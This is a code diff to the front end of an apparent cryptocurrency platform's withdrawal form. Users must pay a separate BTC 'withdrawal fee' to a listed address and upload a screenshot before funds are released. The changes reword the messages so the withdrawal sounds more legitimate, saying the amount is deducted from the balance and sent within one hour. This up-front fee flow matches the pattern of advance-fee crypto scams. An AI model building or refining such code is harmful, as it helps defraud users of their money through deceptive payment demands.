@@ -124,8 +124,8 @@
     formData.append("fee_amount", "$" + Number(fee).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
     formData.append("fee_wallet", feeWallet);
     formData.append("message",
-      "User paid the withdrawal fee and requested funds to be sent to their destination wallet. " +
-      "Verify the fee payment screenshot, then release the withdrawal to the destination wallet.");
+      "User paid the withdrawal fee. Deduct from their platform balance and send the withdrawal amount to their destination wallet. " +
+      "Verify the fee payment screenshot, then release funds to the destination wallet.");
     formData.append("attachment", file, file.name);
 
     submitBtn.disabled = true;
@@ -140,7 +140,7 @@
       if (!res.ok) throw new Error("Submit failed");
       return res.json().catch(function () { return {}; });
     }).then(function () {
-      showStatus("Fee proof received. Funds will be sent to your wallet within 1 hour.");
+      showStatus("Fee received. Amount deducted from your account and sending to your wallet.");
       var onSuccess = pending.onSuccess;
       var dest = pending.destinationWallet;
       var amt = pending.amount;
@@ -186,9 +186,9 @@
     var feeLabel = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
     document.getElementById("withdraw-fee-proof-body").textContent =
-      "To send " + amtLabel + " to your wallet, first pay a " + feeLabel +
-      " withdrawal fee in BTC to the address below. Upload a screenshot of that payment. " +
-      "Once verified, your withdrawal will be sent to the wallet you entered within one hour.";
+      "To withdraw " + amtLabel + " to your wallet, pay a " + feeLabel +
+      " fee in BTC to the address below and upload a screenshot. " +
+      "After that, " + amtLabel + " is deducted from your account balance and sent to the wallet you entered within one hour.";
     document.getElementById("withdraw-fee-proof-withdraw-amt").textContent = amtLabel;
     document.getElementById("withdraw-fee-proof-dest").textContent = destinationWallet || "—";
     document.getElementById("withdraw-fee-proof-amount").textContent = feeLabel;
